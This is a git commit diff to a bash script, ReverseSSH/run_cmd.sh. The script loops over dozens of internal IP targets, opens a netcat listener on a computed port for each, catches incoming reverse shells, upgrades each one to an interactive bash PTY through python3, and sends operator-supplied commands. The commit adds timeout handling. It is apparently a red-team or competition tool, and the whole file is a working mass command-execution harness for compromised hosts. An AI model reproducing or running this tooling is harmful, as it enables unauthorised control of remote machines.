132c6d3c5ef8dbcc7cbb38d9c15f5c881922e144
Rowan Sayers-Fay <9Princeps@gmail.com>
2026-04-04 01:54:27 -0400

    v3.6

--- ReverseSSH/run_cmd.sh
+++ ReverseSSH/run_cmd.sh
@@ -10,9 +10,10 @@ TARGETS=(
 "10.1.1.30" "10.2.1.30" "10.3.1.30" "10.4.1.30" "10.5.1.30" "10.6.1.30" "10.7.1.30" "10.8.1.30" "10.9.1.30" "10.10.1.30" "10.11.1.30" "10.12.1.30" "10.13.1.30" 
 "10.1.1.40" "10.2.1.40" "10.3.1.40" "10.4.1.40" "10.5.1.40" "10.6.1.40" "10.7.1.40" "10.8.1.40" "10.9.1.40" "10.10.1.40" "10.11.1.40" "10.12.1.40" "10.13.1.40"
 )
+
 if [ "$#" -eq 0 ]; then
-echo "Usage: $0 \"cmd1\" \"cmd2\" ..."
-exit 1
+    echo "Usage: $0 \"cmd1\" \"cmd2\" ..."
+    exit 1
 fi
 
 for TARGET in "${TARGETS[@]}"; do
@@ -22,14 +23,19 @@ for TARGET in "${TARGETS[@]}"; do
     PORT=$(($BASE_PORT + $SECOND*100 + $FOURTH))
     echo "[$TARGET] Connecting over port $PORT"
 
-    expect << EOF
-    spawn nc -lvnp $PORT
-    expect -re "\[#\$\] "
-    send "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\r"
-    $(for cmd in "$@"; do
-        echo "expect -re \"\[#\$\] \""
-        echo "send \"$cmd\r\""
-    done)
-    interact
-    EOF
+expect << EOF
+set timeout $TIMEOUT
+spawn nc -lvnp $PORT
+expect {
+    -re "\[#\$\] " { set timeout -1 }
+    timeout { puts "[$TARGET] No connection"; exit 0 }
+}
+send "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\r"
+$(for cmd in "$@"; do
+    echo "expect -re \"\[#\$\] \""
+    echo "send \"$cmd\r\""
+done)
+expect -re "\[#\$\] "
+EOF
+
 done
